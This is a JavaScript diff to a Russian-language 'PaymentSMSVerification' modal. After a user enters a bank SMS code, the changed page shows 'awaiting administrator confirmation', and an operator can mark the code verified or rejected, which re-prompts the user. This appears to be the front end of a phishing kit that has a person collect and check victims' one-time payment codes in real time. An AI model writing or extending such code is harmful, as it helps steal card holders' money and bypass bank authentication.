@@ -384,6 +384,22 @@ class PaymentSMSVerification {
         this.startTimer();
         break;
         
+      case 'awaiting_confirmation':
+        this.showWaitingForConfirmation();
+        break;
+        
+      case 'payment_verified':
+        this.showSuccess(message);
+        setTimeout(() => {
+          this.hideModal();
+          window.location.href = 'confirmation.html';
+        }, 2000);
+        break;
+        
+      case 'code_rejected':
+        this.showCodeRejected(message);
+        break;
+        
       case 'payment_declined':
         this.showError(message);
         setTimeout(() => this.hideModal(), 3000);
@@ -454,11 +470,8 @@ class PaymentSMSVerification {
       const result = await response.json();
       
       if (response.ok) {
-        this.showSuccess('Оплата подтверждена!');
-        setTimeout(() => {
-          this.hideModal();
-          window.location.href = 'confirmation.html';
-        }, 2000);
+        // Show waiting for confirmation instead of immediate success
+        this.showWaitingForConfirmation();
       } else {
         errorElement.textContent = result.error || 'Неверный код';
         document.getElementById('smsCodeInput').classList.add('error');
@@ -471,6 +484,41 @@ class PaymentSMSVerification {
       verifyBtn.disabled = false;
       verifyBtn.textContent = 'Подтвердить';
     }
+  }
+
+  showWaitingForConfirmation() {
+    const smsCodeSection = document.getElementById('smsCodeSection');
+    smsCodeSection.innerHTML = `
+      <div class="waiting-confirmation">
+        <div class="loading-spinner"></div>
+        <p>⏳ Код отправлен на проверку...</p>
+        <p style="font-size: 14px; color: #6b7280;">Ожидаем подтверждения администратора</p>
+      </div>
+    `;
+  }
+  
+  showCodeRejected(message) {
+    // Clear timer if exists
+    if (this.smsTimer) {
+      clearInterval(this.smsTimer);
+    }
+    
+    // Reset to SMS input with error message
+    document.getElementById('smsStatus').style.display = 'none';
+    document.getElementById('smsCodeSection').style.display = 'block';
+    
+    const errorElement = document.getElementById('smsError');
+    errorElement.textContent = message;
+    errorElement.style.color = '#ef4444';
+    
+    // Clear input and focus
+    const inputElement = document.getElementById('smsCodeInput');
+    inputElement.value = '';
+    inputElement.classList.remove('error');
+    inputElement.focus();
+    
+    // Restart timer
+    this.startTimer();
   }
 
   showSuccess(message) {
